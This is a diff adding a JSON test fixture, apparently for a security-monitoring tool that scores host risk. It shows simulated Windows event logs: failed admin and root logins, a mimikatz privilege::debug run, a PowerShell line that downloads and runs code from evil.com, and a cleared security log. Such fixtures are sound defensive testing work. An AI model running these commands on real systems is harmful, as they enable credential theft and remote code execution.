@@ -1,0 +1,48 @@
+{
+  "agent_id": "TEST_HIGH_RISK",
+  "hostname": "COMPROMISED-SERVER",
+  "timestamp": "2025-10-15 10:00:00",
+  "received_at": "2025-10-15T02:09:01.118628",
+  "log_count": 6,
+  "features": [
+    0.06,
+    0.05,
+    0.1,
+    0.0,
+    0.0,
+    1.0
+  ],
+  "risk_score": 0.20166666666666666,
+  "logs": [
+    {
+      "event_id": 4625,
+      "user": "admin",
+      "source_ip": "192.168.1.100"
+    },
+    {
+      "event_id": 4625,
+      "user": "admin",
+      "source_ip": "192.168.1.101"
+    },
+    {
+      "event_id": 4625,
+      "user": "root",
+      "source_ip": "192.168.1.102"
+    },
+    {
+      "event_id": 4688,
+      "process_name": "mimikatz.exe",
+      "command_line": "mimikatz.exe privilege::debug"
+    },
+    {
+      "event_id": 4104,
+      "script_block": "IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com\")"
+    },
+    {
+      "event_id": 1102,
+      "user": "admin",
+      "message": "Security log cleared"
+    }
+  ],
+  "metadata": null
+}
